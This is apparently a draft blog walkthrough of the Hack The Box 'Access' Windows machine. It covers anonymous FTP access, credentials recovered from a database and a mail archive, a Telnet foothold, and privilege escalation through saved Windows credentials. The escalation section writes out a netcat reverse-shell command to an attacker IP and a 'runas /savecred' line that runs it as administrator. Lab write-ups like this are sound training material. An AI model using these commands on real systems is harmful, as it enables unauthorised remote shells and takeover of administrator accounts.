---
title: "Access Walkthrough(Hack The Box)"
date: 2025-03-20
draft: true
description: "a description"
tags: ["Easy", "Windows", "Hack The Box", "Hacking", "Active Directory", "Walkthrough"]
---
## Reconnaissance #Windows 
- We got straight away Webserver on port 80 and Telnet, FTP on the nmap scan.
- ![[Pasted image 20241216220450.png]]
- Apparently anon login allowed in FTP
- Let's try that and the web page mentions LON-MC6 which leads to MS09-042 a vulnerability in Telnet
- Anyway when I try to login in FTP it worked but after that I can't access any directories it's simply giving timeouts
## Enumeration
- There was a e-mail file and database file from the db file there was the password for mail zip file
- Within the mail file a password for Telnet was there
## Foothold
- I got the initial foot in using telnet 
- Then got the user flag
- ![[Pasted image 20241216231714.png]]
## Privilege Escalation
- Using `cmdkey /list` will show the available and stored creds.
- We can use runas for running as something if appropriate constraints are valid
- Here in this case we got saved creds so first lets transfer nc.exe to the machine
- Then use this command to save to bat file
```
echo c:\users\security\nc.exe -e cmd.exe 10.10.14.12 6001 > shell.bat
```
- And execute it with runas command with saved creds
```
runas /user:administrator /savecred c:\users\security\shell.bat
```
- Then we got Administrator access in our nc listener
- We got root access
- ![[Pasted image 20241216233210.png]]
